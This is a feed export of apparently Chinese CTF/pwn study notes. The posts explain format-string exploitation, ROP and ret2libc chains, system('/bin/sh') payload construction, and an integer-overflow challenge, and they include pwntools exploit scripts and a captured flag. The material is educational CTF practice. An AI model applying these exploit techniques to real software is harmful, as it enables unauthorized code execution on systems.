    
    <content type="html"><![CDATA[<h1 id="0x01-格式化字符串漏洞"><a href="#0x01-格式化字符串漏洞" class="headerlink" title="0x01 格式化字符串漏洞"></a>0x01 格式化字符串漏洞</h1><h2 id="漏洞的产生原因及利用原理"><a href="#漏洞的产生原因及利用原理" class="headerlink" title="漏洞的产生原因及利用原理"></a>漏洞的产生原因及利用原理</h2><p>我们在正常的对格式化字符输出时大都使用printf(*format,*arg);<br>此种形式进行输出，但是部分程序员在开发的使用，为了省事使用了，printf(*format);进行输出<br>错误：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s);<br>}</p><p>正确：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s,str);<br>}</p><p>出现字符串格式化漏洞时，有如下方法</p><h3 id="任意地址泄露（读）"><a href="#任意地址泄露（读）" class="headerlink" title="任意地址泄露（读）"></a>任意地址泄露（读）</h3><p>任意地址读需要用到printf的另外一个特性,$操作符.这个操作符可以输出指定位置的参数.利用%n$x这样的字符串就可以获得对应的第n+1个参数的数值(因为格式化参数里边的n指的是格式化字符串对应的第n个输出参数,那么相对于输出函数来说就成了第n+1个).<br>先输入若干个数据确定偏移，比如AAAA%6$x，若输出为AAAA41414141时，就是达到了偏移量，此时偏移为6，若改为AAAA%7$x，脚本写为</p><blockquote></blockquote><p>conn.sendline(“%7$s”+p32(0x08048000))</p><p>会打印处0x0804800地址前几字段。<br>原因如下：此脚本中将p32(0x08048000)率先压入栈中，当其格式化串超出偏移值1个位置时，会读取栈上此地址，然后进行打印，看如下栈图。<br><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p1.jpg"></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>利用%n的特性，可以将已打印字符数传给后续传入的地址<br>如：<br>printf(“%.100d%n”,c,&amp;c);<br>可以打印100个c，然后将100赋值到c的地址处。</p><p>总结一下<br>payload核心在于，先计算出偏移值，再利用%kc%m$n进行修改</p><h3 id="攻防世界题-string（新手区）"><a href="#攻防世界题-string（新手区）" class="headerlink" title="攻防世界题 string（新手区）"></a>攻防世界题 string（新手区）</h3><p>此题有几点需要注意，首先是这个样子的代码，是可以考虑传入shellcode直接执行</p><blockquote><p>((void (__fastcall*)(_QWORD))v1)(0LL)</p></blockquote><p>此行会将v1转化为代码执行，使用</p><figure class="highlight moonscript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>, <span class="hljs-built_in">os</span> = <span class="hljs-string">&#x27;linux&#x27;</span><br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>得到shellcode机器码。</p><p>再者就是灵活运用printf(format)这样的漏洞<br>如本题中，需要泄露v3的地址，且此地址就在漏洞printf不远处，就不要用AAAA-%p….的形式去泄露AAAA所存储的地址了，而是直接找v3对应内存的值，在输入%p….后对应偏移量为多少</p><h3 id="记录一个新方法"><a href="#记录一个新方法" class="headerlink" title="记录一个新方法"></a>记录一个新方法</h3><p>修改地址法<br>用到pwn里的fmtstr_payload(offset,{被替换的：替换为})<br>这个语法<br>如将atoi的got地址改为system的plt地址，可以写为<br>payload = fmtstr_payload(offset,{atoi_got : system_plt})即可利用格式化字符串修改地址</p><h1 id="0x02-ROP"><a href="#0x02-ROP" class="headerlink" title="0x02 ROP"></a>0x02 ROP</h1><h2 id="寄存器传参顺序"><a href="#寄存器传参顺序" class="headerlink" title="寄存器传参顺序"></a>寄存器传参顺序</h2><p>64位系统中，函数传参进入寄存器<br>而32位是先入栈再传入数据。<br>64位的传参顺序：前7个参数，从左至右依次传入rdi，rsi，rdx，rcx，r8，r9，r15.</p><h2 id="简单ROP"><a href="#简单ROP" class="headerlink" title="简单ROP"></a>简单ROP</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>若题目没给libc版本，需要用LibcSearch来做，其中格式为libc.dump(‘system’)<br>如果给了libc版本，可以这样<br>libc = ELF(‘./libc-2.xx.so’)这样子<br>搜索/bin/sh字符串所在位置时，有如下语法：<br>next(libc.search(b’/bin/sh’))可以获取binsh的地址</p><h3 id="关于strlen-检测的绕过"><a href="#关于strlen-检测的绕过" class="headerlink" title="关于strlen()检测的绕过"></a>关于strlen()检测的绕过</h3><p>read函数读至’\n’结束<br>strlen读至’\x00’结束<br>在32位里面，char数组读入时：read(0,buf,10u)，就读入十个char，而’\x00’是一个char<br>故遇到检查strlen来进行阻碍时，可以在字符串前面输入’\x00’开头，来规避之。</p><h3 id="关于构造好ROP以后，接收got表地址时的注意事项"><a href="#关于构造好ROP以后，接收got表地址时的注意事项" class="headerlink" title="关于构造好ROP以后，接收got表地址时的注意事项"></a>关于构造好ROP以后，接收got表地址时的注意事项</h3><p>1.32位系统下，got表地址是4byte，用p.recv(4);u32(write)来收取<br>2.64位系统下，got表地址位8byte，需要进行相当的调整。</p><h1 id="0x03-堆heap"><a href="#0x03-堆heap" class="headerlink" title="0x03 堆heap"></a>0x03 堆heap</h1><p>引用经典内存布局</p><p><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>basic usage of libc</title>
    <link href="/2022/03/22/basic-usage-of-libc/"/>
    <url>/2022/03/22/basic-usage-of-libc/</url>
    
    <content type="html"><![CDATA[<h1 id="libc的基本用法"><a href="#libc的基本用法" class="headerlink" title="libc的基本用法"></a>libc的基本用法</h1><h2 id="题目来源：XCTF-PWN-新手区-level3"><a href="#题目来源：XCTF-PWN-新手区-level3" class="headerlink" title="题目来源：XCTF-PWN-新手区-level3"></a>题目来源：XCTF-PWN-新手区-level3</h2><h2 id="0下"><a href="#0下" class="headerlink" title="0下"></a>0下</h2><h2 id="0x1-基本分析"><a href="#0x1-基本分析" class="headerlink" title="0x1 基本分析"></a>0x1 基本分析</h2><p>32-bit elf文件</p><p>NX保护开启</p><p>32位IDA下，仅有一个read溢出点</p><p>栈溢出方式获取system权限</p><h2 id="0x2-找到突破口"><a href="#0x2-找到突破口" class="headerlink" title="0x2 找到突破口"></a>0x2 找到突破口</h2><p>没有任何后门函数，没有调用system函数<br><br>但是题目给出了libc_32.so.6文件<br><br>思路如下：<br><strong>利用题目中调用的write函数，打印自身got表地址，通过write函数与libc基址的offset值，获得libc基址，从而调用libc中的内容（libc中既有system函数又有/bin/sh字符串）</strong></p><p>构建exp脚本如下：<br><img src="/2022/03/22/basic-usage-of-libc/p1.png" alt="exp脚本"></p><ol><li>完成136大小的buf字符串数组溢出和32位下saved_register  ebp的溢出</li><li>用write函数地址覆盖返回地址，以调用write函数。</li><li>布置栈帧，此处覆盖意义为，write函数的返回地址，覆盖为main函数地址，准备第二次溢出。</li><li>布置栈帧，write函数的参数。（通过此处获取got地址）</li></ol><p><br>\</p><p>第二次溢出，覆盖后调用system(“/bin/sh”)<br>完成本题。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><ol><li>用elf = ELF(“./file”)的形式调用文件内，自有的函数的plt、got地址。</li><li>32位的题，用布置栈帧方法。</li><li>打印出来的got地址，用u32方法解码后，是该函数在libc中的真实地址。</li><li>用libc.symbols[“func”]的方法获取函数func相对基址的offset。</li><li>二次溢出，达到一次拿地址，二次打通的效果。</li><li>教科书式的题值得多次揣摩！</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create /bin/sh</title>
    <link href="/2022/03/20/create-bin-sh/"/>
    <url>/2022/03/20/create-bin-sh/</url>
    
    <content type="html"><![CDATA[<h1 id="当目标有调用system函数，但无-bin-sh字符串时"><a href="#当目标有调用system函数，但无-bin-sh字符串时" class="headerlink" title="当目标有调用system函数，但无/bin/sh字符串时"></a>当目标有调用system函数，但无/bin/sh字符串时</h1><p>xctf pwn新手区最后三题之一，cgpwn2.</p><p>打开IDA乍一看，没有后门函数，没有明显的可导向的返回地址。</p><p><img src="/2022/03/20/create-bin-sh/bin1.png"></p><p>关注有两个读取输入的地方，一个是有限制大小的读取函数，另一个是gets()这个危险函数。</p><p>考虑到这题只开启了NX保护，栈溢出应该是必须的。</p><p>于是，思路是通过name字符串，导入“/bin/sh”字符串。</p><p>再通过gets()溢出，传入_system函数地址，最后传入/bin/sh。</p><p>\</p><blockquote><p>payload = b’a’*42 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>上面是脚本中核心语句。</p><p>b’a’*42 填充字符串和ebp</p><p>后面传入system函数地址替换原有返回地址，以调用system函数。</p><p>进入system函数后，因为这里是32位程序，推荐用布置栈帧的方式传参。</p><p>也就是，调用system后，此时位于system函数栈的ebp顶部。</p><p>需要传入一个4字节的数据，填充返回地址，然后来到传入的参数部分。</p><p>将/bin/sh 字符串的地址传入，完成传参。</p><p>达到调用system(“/bin/sh”)的目的。</p><p>劫持到程序，cat flag拿到答案。</p><p>总结下，第一眼看上去没法溢出，是因为忽略了通过传参的手段，构造一个system(“/bin/sh”)的可能性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xctf int_overflow整数类型的溢出</title>
    <link href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p><h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote><p>file into<br>chmod 777 into<br>./into</p></blockquote><p>先确定into为32位elf文件</p><h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p><blockquote><p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p>linux中</p><blockquote><p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p></blockquote><p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p><p>结束</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NX-ROP</title>
    <link href="/2022/03/02/NX-ROP/"/>
    <url>/2022/03/02/NX-ROP/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是NX与ROP"><a href="#什么是NX与ROP" class="headerlink" title="什么是NX与ROP"></a>什么是NX与ROP</h1><p><strong>NX即为no execute bit，即禁止执行位</strong><br><br>以下是wiki中文的解释</p><blockquote><p>支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执行，从而攻ji甚至控制整台电脑系统）。</p></blockquote><p>个人理解就是不能用常规的最简单的栈溢出手段，来直接修改返回地址为目标函数地址。<br><br><strong>ROP即返回导向编程（英语：Return-Oriented Programming，缩写：ROP）</strong><br>其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>因为开启了NX 保护，我们不可以把shellcode放到栈上来执行了，因此我们就需用用到ROP技术来迂回获得SHELL。</strong><br><br><br><strong>++本文是学习笔记形式，许多内容与原文章相同，但会加入部分个人理解。因为自学ctf确实费劲，一个地方搞不懂会困扰几天，希望我个人对样例的复现过程，和我的经验能帮助到后来者，少走弯路。++</strong><br><br><strong>原文地址</strong></p><blockquote><p><a href="https://bbs.pediy.com/thread-221041.htm">https://bbs.pediy.com/thread-221041.htm</a></p></blockquote><p>再次感谢原文大佬作者！</p><h2 id="win的IDA-pro与虚拟机中的linux联合调试方法"><a href="#win的IDA-pro与虚拟机中的linux联合调试方法" class="headerlink" title="win的IDA pro与虚拟机中的linux联合调试方法"></a>win的IDA pro与虚拟机中的linux联合调试方法</h2><p>1.在IDA中选中remote linux debugger<br><br>2.在菜单debugger下拉菜单里选择process option选项，设置如下：<br><img src="/2022/03/02/NX-ROP/cto1.png" alt="test-png"><br>其中目录就选择rop所在目录，hostname填上linux虚拟机的ip，端口默认选择23946<br><br>3.然后打开linux虚拟机，并把ida目录下的linxu_serverX64拷贝到虚拟机里并执行<br><img src="/2022/03/02/NX-ROP/cto2.png" alt="image.png"></p><p><br>4.用py编写调试代码rexp.py如下：<br><br> <br>#! /usr/bin/python<br>from pwn import *<br>import pdb<br>context.log_level = ‘debug’<br>target = process(‘./rop’)<br>elf=ELF(‘./rop’) #这个会显示rop用了哪些保护技术<br>pdb.set_trace()#这里设置一个pdb断点，可以让ida附加rop进程<br><br><br>target.sendline(‘a’64+’b’8+’c’*8)<br>target.interactive()<br>5.然后在linux系统上新开一个终端，执行rexp.py如下<br><img src="/2022/03/02/NX-ROP/cto3.png" alt="image.png"><br><br>6.在ida vuln函数里的gets函数后面下好断点<br><br>7.然后点击debugger,附加远程进程，找到./rop打开<br><img src="/2022/03/02/NX-ROP/cto4.png" alt="image.png"><br>并按F9执行<br><br>8.回到linux中，在Pdb终端里面输入n并回车（即next，下一步的意思)<br><br>9.可以看见IDA中出现同步的动态调试信息。<br><br><strong>以上便是IDA与linux的联合调试过程</strong><br><br>\</p><h2 id="开启NX保护与不开启时，做题时的不同感受"><a href="#开启NX保护与不开启时，做题时的不同感受" class="headerlink" title="开启NX保护与不开启时，做题时的不同感受"></a>开启NX保护与不开启时，做题时的不同感受</h2><p>1.开启NX以后，最直接的效果就是不能在栈上执行shellcode，也就是不能直接通过溢出，修改返回地址为shellcode，来获得shell。<br>2.但是开启NX以后，可以修改返回地址为已有的backdoor函数得到shell。<br>3.如果没有现成的backdoor函数，则需要我们想办法转移到其他空间，执行shellcode。</p><h2 id="64位与32位下，简单的应对NX保护的方式"><a href="#64位与32位下，简单的应对NX保护的方式" class="headerlink" title="64位与32位下，简单的应对NX保护的方式"></a>64位与32位下，简单的应对NX保护的方式</h2><p>即构造ROP链<br>1.64位环境下，一般先搜索有类似“pop rdi ; ret;”形式的代码段<br>命令：</p><blockquote><p>ROPgadget –binary 文件名 | grep “pop rdi”</p></blockquote><p>找到相关代码段后，payload第一部分覆盖缓冲区和rbp（ebp）后，便接上ROPgadget找到的gadget地址。<br>为什么要寻找pop rdi呢？<br>因为函数第一个参数一般都存在rdi中，这样可以达到传参的目的。<br>再寻找”/bin/sh”字符串地址，链接在rop链后。<br>随后传入_system函数地址，作用是，通过ret指令，跳转至该地址，执行system()<br>此时rdi已经被设置好为”/bin/sh”，即会执行system(“/bin/sh”)<br>获得系统权限。<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*8 + p64(pop_rdi_addr) + p64(/bin/sh_addr) + p64(_system_addr)</p></blockquote><p>2.32位环境下一般采用布置栈帧，达到调用函数、传递参数的目的<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*4 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>首先，覆盖完缓冲区后，为了达到返回地址处，要覆盖ebp，ebp的大小是4个字节。<br>然后通过修改返回地址，进入system函数，此时我们位于system函数栈帧中的ebp处，我们需要填充一下ebp下面的返回地址，随便设置为0x0.<br>紧接着导入/bin/sh字符串，达到传参的目的。</p><p><br>以上便是本人对NX及ROP技术初次认识的浅显简介，让各位见笑了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
